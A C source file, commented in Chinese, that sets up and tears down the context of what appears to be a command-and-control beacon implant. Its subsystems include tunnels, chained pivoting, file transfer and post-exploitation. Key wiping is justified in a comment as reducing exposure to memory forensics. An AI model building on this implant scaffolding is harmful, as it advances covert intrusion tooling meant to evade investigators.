#include "beacon_context.h"

#ifdef BEACON_TEST
#include "beacon_test_hooks.h"
#endif

/*
 * ContextInit - 零初始化信标上下文并启动所有子系统。
 *   先通过临时变量生成随机信标 ID 和会话密钥，全部成功后才写入上下文。
 *   随机数失败时清理敏感数据并返回 FALSE。
 */
BOOL ContextInit(BeaconContext* ctx)
{
    UINT32 beacon_id = 0;
    BYTE8 session_key[BEACON_SESSION_KEY_SIZE];

    if (!ctx) return FALSE;

#ifdef BEACON_TEST
    BeaconTestRecord(BEACON_TEST_EVENT_CONTEXT_INIT_BEGIN, 0, 0);
#endif

    ZeroMemory(ctx, sizeof(*ctx));

    /* 加载默认配置并收集系统元数据 */
    ProfileLoad(&ctx->profile);
    SysinfoCollect(&ctx->meta);

    /* 生成唯一的信标标识符和随机会话密钥，失败则清理并返回 FALSE */
    if (!CryptoRandomU32(&beacon_id) ||
        !CryptoRandom(session_key, sizeof(session_key))) {
        SecureZeroMemory(session_key, sizeof(session_key));
        SecureZeroMemory(ctx, sizeof(*ctx));
#ifdef BEACON_TEST
        BeaconTestRecord(BEACON_TEST_EVENT_CONTEXT_INIT_FAILED, 0, 0);
#endif
        return FALSE;
    }

    ctx->beacon_id = beacon_id;
    memcpy(ctx->session_key, session_key, sizeof(ctx->session_key));
    SecureZeroMemory(session_key, sizeof(session_key));

    ctx->active = 1;

    /* 初始化子系统管理器 */
    RuntimeGateInit(&ctx->runtime);
    OutboxInit(&ctx->outbox);
    JobInit(&ctx->jobs);
    TransferInit(&ctx->transfers, ctx);
    TunnelInit(&ctx->tunnels, ctx);
    CascadeInit(&ctx->cascade, ctx);
    PostExInit(&ctx->postex, ctx);

    return TRUE;
}

/*
 * ContextFree - 拆除子系统并清除敏感密钥材料。
 */
VOID ContextFree(BeaconContext* ctx)
{
#ifdef BEACON_TEST
    BeaconTestRecord(BEACON_TEST_EVENT_CONTEXT_FREE, 0, 0);
#endif

    PostExFree(&ctx->postex);
    JobFree(&ctx->jobs);
    CascadeFree(&ctx->cascade);
    TunnelFree(&ctx->tunnels);
    TransferFree(&ctx->transfers);
    OutboxFree(&ctx->outbox);
    RuntimeGateFree(&ctx->runtime);

    /* 在释放上下文之前从内存中擦除全部密钥材料：
     * session_key（会话密钥）+ profile 中的三份根密钥字符串。
     * 根密钥与派生密钥的防护标准应一致，存活到进程退出的明文密钥
     * 会扩大内存取证/转储的暴露面。 */
    SecureZeroMemory(ctx->session_key, sizeof(ctx->session_key));
    SecureZeroMemory(ctx->profile.encrypt_key, sizeof(ctx->profile.encrypt_key));
    SecureZeroMemory(ctx->profile.http.encrypt_key, sizeof(ctx->profile.http.encrypt_key));
    SecureZeroMemory(ctx->profile.tcp_external.encrypt_key,
                     sizeof(ctx->profile.tcp_external.encrypt_key));
}
